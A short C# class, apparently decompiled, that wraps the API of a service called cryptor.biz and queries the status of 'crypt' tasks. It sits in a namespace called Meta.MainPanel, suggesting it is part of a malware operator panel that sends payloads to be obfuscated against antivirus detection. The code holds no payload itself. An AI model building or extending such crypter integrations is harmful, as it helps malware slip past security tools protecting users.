using Meta.MainPanel.Models.CryptorBiz;
using Meta.SharedModels;
using RestSharp;
using System;

namespace Meta.MainPanel.Data.Helpers;

public class CryptorBizAPI
{
    private object object_0;

    private object object_1;

    public string ApiBaseUrl => "https://cryptor.biz/api";

    public CryptorBizAPI(string apikey)
    {
        object_0 = new RestClient(ApiBaseUrl);
        ((IRestClient)object_0).AddDefaultParameter("apikey", apikey.Trim());
        object_1 = apikey;
    }

    public CryptInfoResponse GetCryptInfo(string taskId)
    {
        try
        {
            RestRequest restRequest = new RestRequest("crypt/info", Method.POST);
            restRequest.AddParameter("task_id", taskId);
            return ((IRestClient)object_0).Post(restRequest).Content.FromJSON<CryptInfoResponse>();
        }
        catch (Exception)
        {
        }
        return null;
    }
}
